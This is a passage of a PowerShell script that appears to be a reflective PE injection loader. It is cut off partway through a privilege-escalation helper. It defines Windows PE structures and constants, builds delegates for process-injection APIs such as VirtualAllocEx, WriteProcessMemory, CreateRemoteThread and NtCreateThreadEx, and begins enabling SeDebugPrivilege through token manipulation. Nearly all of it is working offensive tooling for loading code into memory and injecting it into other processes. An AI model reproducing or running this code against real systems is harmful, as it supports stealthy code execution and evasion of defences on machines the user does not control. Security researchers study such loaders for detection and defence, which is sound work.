        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

        return $Win32Functions
    }
    #####################################


    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }

                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

        $PEEndAddress = $PEInfo.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }

    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )

        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

